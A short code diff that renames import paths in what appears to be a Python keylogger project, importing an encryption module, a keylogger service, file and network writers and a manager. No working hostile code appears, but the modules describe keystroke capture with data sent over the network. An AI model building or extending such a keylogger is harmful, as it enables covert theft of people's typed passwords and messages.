@@ -1,8 +1,8 @@
 from keylogger.encryption.encryption import Encryption
-from keylogger.KeyliggerServise.KeyloggerServise import KeyLogger
+from keylogger.keyligger_servise.keylogger_servise import KeyLogger
 from keylogger.writer.file_writer import FileWriter
 from keylogger.writer.network_writer import NetworkWriter
-from keylogger.KeyLoggerManager.Manager import KeyLoggerManager
+from keylogger.keyLogger_manager.manager import KeyLoggerManager
 import time
 from datetime import datetime
 
